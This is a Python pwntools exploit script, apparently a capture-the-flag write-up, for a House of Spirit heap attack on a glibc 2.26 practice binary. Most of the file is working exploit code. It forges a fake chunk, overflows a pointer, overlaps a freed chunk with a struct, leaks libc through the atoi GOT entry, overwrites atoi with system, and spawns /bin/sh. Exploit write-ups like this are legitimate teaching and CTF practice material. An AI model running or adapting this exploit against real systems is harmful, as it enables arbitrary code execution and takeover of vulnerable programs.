#!/usr/bin/env python3
'''
House of Spirit Challenge writeup - TCache on 2.26
''' 
from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '' # For alternate version of libc
env = {}

# Binary setup
elf_name = '.critic-2.26'
libc_name = "../../../libc_versions/2.26/libc-2.26.so"
elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env)
	gdb.attach(p)
else: 
	p = remote(domain, port) 

# Send the name of the resturant
def set_critic(name, intro=False):
	if(intro == False): 
		p.sendlineafter(">", "5")

	p.sendlineafter("Name", name)

# Add a sandwich (order) to review
def add(jelly, butter): 
	p.sendlineafter(">", "1") 
	p.sendlineafter("Type: ", jelly) # Input for butter
	p.sendlineafter("Type: ", butter)  # Input for jelly
	return 

# Review the sandwich (review) 
def review(stars, review_notes):
	p.sendlineafter(">", "2") 
	p.sendlineafter(">", str(stars)) # Input for stars
	p.sendlineafter(">", review_notes) # Input for review_notes 
	return 

# Edit a review
def edit(index, stars, notes):
	p.sendlineafter(">", "4") 
	p.sendlineafter("again:", str(index))
	p.sendlineafter(">", str(stars)) # Input for stars
	p.sendlineafter(">", notes) # Input for review_notes
	return 

# Print a sandwich
def print_review(index): 
	'''
	In Python 3, the trick is to use \\n instead of \n. 
	This allows the .replace to know what is going on.
	'''
	p.sendlineafter(">", "3") 
	p.sendlineafter("view:", str(index))
	p.recvuntil("Stars: ") 
	stars = p.recvuntil("Sandwich")
	stars = stars.replace(b"\nSandwich", b"")
	p.recvuntil("Name: ")  
	sandwich_name = p.recvuntil("Review").replace(b"Review", b"")
	p.recvuntil("Text: ") 
	review_notes = p.recvuntil("Peanut Butter").replace(b"\nPeanut Butter",b"")

	return stars, sandwich_name, review_notes

# Creates a fake chunk for the house of spirit
def fake_chunk():

	'''
	At this point, we KNOW we have a buffer overflow in 
	the jelly_ptr pointer that gets freed within a sandwich. 
	
	However, we have to FREE this before any other interactions
	happen. The freeing of chunks must meet the following requirements: 
	- Memory aligned (on 64-bit, this must end with a 0x0) 
	- A proper size must be used. 

	The 'critic_name' is a fantastic candiate to put a 'fake chunk'
	because:
	- We control the contents of it well
	- The field is editable

	This is important for two reasons: 

	- Easy to create a proper fake chunk
	- Once the chunk has been allocated (with a 'review') we can 
	  alter the 
	  sandwich data values (including the pointers) with whatever we want!

	What bin do we want to create the fake chunk in? Well, the review
	struct is the ONLY thing that is editable, once the overflow occurs. 
	So, added a chunk to the 0x50 bin (to be used as a review later) 
	makes the most sense. 


	The fake chunk would look like this: 
	
	--------------
	prev_size 0x0 
	size 0x51 <-- Want to go into the 0x50 fastbin
	--------------

	Haha, there is something wrong here! 'strcpy' does not copy 
	null bytes! So, we have to be clever here...
	The 'prev_size' is ONLY used if consolidation happens. So, 
	as long as consolidiation does NOT happen, this can be whatever
	value we want. 

	Although the 'prev_inuse' bit does not need to be set, it is easy 
	to set and can prevent issues down the road. 

	Additionally, the fastbin has a check to 'nextchunk'
	that ensures it has a proper size. So, we have to add
	the code for this check in too. This check can be found at: 
	https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3897. 
	Real fake chunk: 

	--------------
	prev_size: AAAAAAAA
	size: 0x51 <-- Want to go into the 0x50 fastbin bin
	--------------
	prev_size: don't care
	size: 0x20 (just needs to be a valid size) 

	'''
	#######################
	# Create a fake chunk #
	#######################

	# The fake_chunk 'next size' we need to make
	fake_next_size = bytes("A" * 0x50, 'utf-8') # Accounts for the fake_chunk size 
	fake_next_size += b"B" * 8 # prev_size of nextchunk
	fake_next_size += p64(0x20) # Fake size 
	
	set_critic(fake_next_size, intro=True)

	# The sizes of all the reviews are of 0x50
	chunk_size = 0x51 

	'''
	Because we cannot write NULL bytes, the payload 
	becomes a little more complicated. 

	Even though we can't DIRECTLY write NULL bytes, the ending of 
	all strings has a NULL byte! So, if we add data while 
	decrementing the length one byte at a time, then we can 
	write a arbitrary NULL bytes clean up the data. 

	For example, look at the following data: 
	---------
	AAAAAAAAA\x00 <--- null byte at end to terminate string
	---------
	
	Now, if we write the LENGTH - 1 byte then it will look like the 
	following: 
	---------
	AAAAAAAA\x00\x00 <--- Two null bytes!
	---------

	There is one place where this must be NULLED out: 
	- Bytes around size

	By using the trick above, we can clear all but 0x41 for the size.

	Now, when we try to run the house of spirit and iterate over the 
	chunk later, it will be possible :)	 
	'''

	# NULLing out bytes around the 'size' 
	for i in range(8):
		fake_chunk = "A" * (8 + 7-i)
		set_critic(fake_chunk, intro=False)

	# Filler for the prev_size 
	fake_chunk = b"A" * 8 	# Offset 0x0
	
	# The fake chunk size
	fake_chunk += p64(chunk_size) # Offset 0x8

	# Use the critic name as a fake chunk for later
	set_critic(fake_chunk, intro = False) 


def buffer_overflow():
	###########################
	# Exploit Buffer Overflow #
	###########################

	'''
	Sandwich struct:
	------------
	0-0x47: Butter Buffer
	0x48-0x5f: jelly_ptr
	------------

	The structure (after the butter variable) has a pointer to 
	the 'jell_ptr' ptr. Because the butter variable has a buffer 
	overflow, we can OVERWRITE this with an arbitrary value. 
	Below is an example of this vulnerability: 

	------------
	0-0x47: Butter Buffer
	0x48-0x5f: AAAAAAAAAAAA <-- Corrupted jelly_ptr
	------------


	We will set the 'jelly_ptr' pointer to the fake_chunk 
	(from the previous step) that we made. An example of this 
	is shown below:

	------------
	0-0x47: Butter Buffer
	0x48-0x5f: fake_chunk <-- Fake jelly_ptr be perform house of spirit
	------------

	'''

	print("Overwriting pointer with 0x50 chunk via buffer overflow")

	# Filler prior to overflow
	butter = bytes("A" * (9 * 0x8), 'utf-8') 
	
	# Location of the 'critic_name' variable, which holds our fake chunk.
	# We add 0x10 because the pointer (that the user is given) is mem + 0x10.
	butter += p64(elf.symbols['critic_name'] + 0x10) 

	# Exploit the buffer overflow to overflow 'next' ptr to setup HoS
	add("B" * 8, butter)

def house_of_spirit():
	'''
	This happens really fast (within the same function). So, it
	can be hard to follow. In a nut shell, we ONLY care about the 
	mallocs and frees. So, here is what happens: 
	1. Free sandwich->jelly_ptr (0x50 fastbin -- fake_chunk at critic_name)
	2. Free sandwich struct  (0x60 fastbin)
	3. Malloc new review (0x50 chunk)
	4. Malloc reviews 'review_notes' (0x40 chunk) 

	The fastbin looks like the following prior to step 3:

	0x20: 
	...
	0x50 bin: critic_name + 0x10
	0x60 bin: old sandwich_struct
	...


	From the previous steps, recall we have 
	created a fake 0x50 sized chunk at 'jelly_ptr'. So, 
	once this is freed, it will be added to the 0x50 fastbin.
	
	Why is this awesome? Now, once the 'review' struct is Malloced, it will
	request a chunk of size 0x50! Once this is returned, 
	we have created a 'review' struct within 'critic_name'! 
	The diagram below shows what this looks like: 

	----------------
	prev_size: AAAAAAAA             <--------|
	size: 0x51                               |
	stars (start data section of chunk)      | This is all within critic_name
	review_notes (pointer!)			 		 |
	.... 			                 		 |
	----------------                <--------|

	We have COMPLETE control over the 'critic_name'. This 
	means that we can ALTER the 'review' struct! To do whatever
	we want, including the pointers!

	NOTE: 
	The house of spirit (freeing arbitrary chunk into a bin) 
	AND reallocate are done in the same step here. 
	In order to SEE what is going on, step-by-step dynamic
	debugging is required. 	
	'''
	###################   ################
	# House of Spirit # & # Reallocation # 
	###################   ################

	print("Freeing arbitrary pointer (House of Spirit)")
	print("The 'critic_name' variable is put into the 0x50 fastbin")	
	review("A", "B") 	

	print("Review at index 0 is now in 'critic_name'")



def read_write_prim():
	'''	
	After overlapping the chunks, critic_name/sandwich will look like:
	----------------
	prev_size: AAAAAAAA             <--------|
	size: 0x51                               |
	stars (start data section of chunk)      | This is all within critic_name
	review_notes (pointer!)			 		 |
	.... 			                 		 |
	----------------                <--------|


	Because we control the 'critic_name' variable, we 
	will be able to write all over the data in the review!
	
	Anything look juicy here? There is a pointer (review_notes) 
	that we can overwrite for both 'reading' and 'writing'! 
	From this, we can create an arbitrary write or read primative 
	by overriding the review->review_notes variable by editing
	critic_name.
	
	If we overwrite the review->review_notes, we can READ from 
	anywhere via the 'print_review' command. Additionally, to write 
	anywhere, we just edit a review. Of course, in order to set 
	the location of where to read or write to, we need to alter 
	this pointer via a call to 'set_critic'. 

		
	We HAVE the primitive, but what to overwrite? The easiest way 
	to get code execution is to overwrite a function pointer of 
	somekind with either system or a one_gadget. 

	In order to do this, we need to know WHERE LibC is at. 
	The best way to do this is use the GOT to leak an address to LibC. 

	The choice of GOT? 'atoi' works for both a READ 
	(any GOT entry works for a read) 
	and a WRITE (shown in the next step -- win). So, we can choose 
	to use 'atoi' here. 
	'''


	##########################
	# Leak via Ptr Overwrite #		
	##########################
	print("Writing GOT table address over jelly_ptr to leak LibC")

	'''
	Overwrite the 'review_notes' to read/write to anywhere
	The 'review_notes' is overwritten with the location of 
	the *atoi* GOT entry	
	This will have an address to GLibC at this location for leak.
	'''

	print(hex(elf.got['atoi']))

	set_critic(bytes("A" * 0x18, 'utf-8') + p64(elf.got['atoi']))

	_, _, review = print_review(0)

	print("Address of atoi", hex(elf.got['atoi']))

	libc_leak = u64(review.ljust(8, b"\x00")) 
	print("LibC Leak: ", hex(libc_leak)) 

	libc_base = libc_leak - libc_offset
	print("LibC Base: ", hex(libc_base))
	return libc_base


def win(libc_base):
	'''
	The 'jelly_ptr' is pointing to 'atoi' GOT entry 
	(from the previous step).

	We overwrite aoti with 'system' because this gives us an easy shell. 
	'atoi' is a great GOT entry to overwrite because it accepts a 
	string that we control as the input. This emulates us calling system
	in as normal way as possible. 

	Star is used as the parameter for 'system'. This is because 
	'atoi' takes in a parameter that is a pointer to a string. 
	By passing in a 'stars' as the shell command (which we control), we can 
	control the parameter for system!
	'''
	##################
	# Code Execution # 
	##################
	print("Overwrite atoi GOT with system")
	print("System: ", hex(libc_base + system_offset))

	edit(0, 0x1337, p64(libc_base + system_offset))

	'''
	The next call to 'atoi' will run 'system' (edit has the only 
	call to atoi in the program).  Because atoi 
	accepts a string (convert 'star' into integer from tmp_buffer) 
	we pass in the command to the 'star' in order to execute
	arbitrary shell commands :) 

	Additionally, because the pop shell happens BEFORE the 
	end of the program, we just emulate the first half of 
	'edit' and then go into an interactive mode after
	passing the shell command. 
	'''
	pause()
	p.sendlineafter(">", "4") 
	p.sendline("0") 
	p.sendline("/bin/sh")  # Star <-- system parameter



''' 
Plan: 

- Overwrite next pointer to point to the critic (with a fake chunk) 
- House of spirit (free the chunk that we just corrupted) 
- Edit critic_name to change jelly_ptr to PLT/GOT entry 
	- Use this to read (leak LibC) 
	- Use this to write (system) 
- Win :)

'''

system_offset = 0x3ef96
libc_offset = 0x338aa

fake_chunk() # Create fake chunk for next step 
buffer_overflow() # Overflow 'jelly_ptr' with fake chunk
house_of_spirit() # Free fake chunk then allocate it over 'review' struct
libc_base = read_write_prim() # Overwrite 'review_notes' with GOT entry 
win(libc_base) # Write 'system' to GOT entry to win :)
p.interactive()


